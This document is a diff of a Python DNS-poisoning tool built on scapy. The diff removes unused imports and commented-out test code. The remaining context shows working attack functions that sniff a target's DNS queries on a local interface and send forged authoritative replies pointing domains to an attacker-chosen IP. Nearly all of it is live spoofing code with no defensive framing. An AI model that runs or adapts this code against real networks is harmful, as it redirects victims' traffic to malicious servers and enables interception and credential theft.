@@ -3,12 +3,10 @@ import logging as log
 import platform
 import threading
 import time
-from tabnanny import verbose
 
 from scapy.all import *
 from scapy.layers.dns import DNSRR, DNS, IP, UDP, DNSQR
 
-from utils import thread_with_trace
 from networking_functions import get_local_ip
 
 from colorama import init, Fore
@@ -66,7 +64,6 @@ def forge_packet_better(packet_to_forge, target_ip, router_ip, printing_queue, v
         printing_queue.put(packet_to_forge)
 
     original_qname = packet_to_forge[DNSQR].qname.decode('UTF-8')
-    # original_qname = packet_to_forge[DNS].qd.qname.decode('UTF-8')
 
     if verbosity > 0:
         printing_queue.put(f"{GREEN}[+] Dns with: "+ original_qname + f" arrived{RESET}")
@@ -98,23 +95,6 @@ def forge_packet(packet_to_forge, fake_server_ip):
                     DNS(id=packet_to_forge[DNS].id, qr=1, aa=1, qd=packet_to_forge[DNS].qd, an=forged_DNSRR)
     return forged_packet
 
-
-# def process_dns_packet(packet_to_process, target, router_ip):
-    # print(packet_to_process[DNS].qd.qname.decode('UTF-8'))
-    # print(packet_to_process[IP].src)
-    # print(target)
-    # current_domain = packet_to_process[DNS].qd.qname.decode('UTF-8')
-    # if packet_to_process[IP].src == target:
-    #     print("packet of target")
-        # forge_packet_better(packet_to_process, target, router_ip)
-        #
-        # forged_packet = forge_packet(packet_to_process, ip)
-        #
-        # send(forged_packet, verbose=0)
-        # print(
-        #     f"[*] Forged DNS response sent. Told {packet_to_process[IP].src} that {packet_to_process[DNS].qd.qname.decode('UTF-8')} was at {ip}")
-
-
 def start_dns_poisoning(interface_to_listen, target_ip, router_ip, printing_queue, verbosity):
     cancel_token = threading.Event()
     dns_thread = threading.Thread(target=dns_poisoning_loop,
@@ -132,5 +112,3 @@ def dns_poisoning_loop(interface_to_listen, target_ip, router_ip, printing_queue
         sniff(iface=interface_to_listen, prn=lambda pkt: forge_packet_better(pkt, target_ip, router_ip, printing_queue, verbosity), store=0,
               count=1, filter=bpf_filter)
 
-# if __name__ == "__main__":
-#     dns_thread_token = start_dns_poisoning("wlan0", "192.168.2.100", 0, 1)
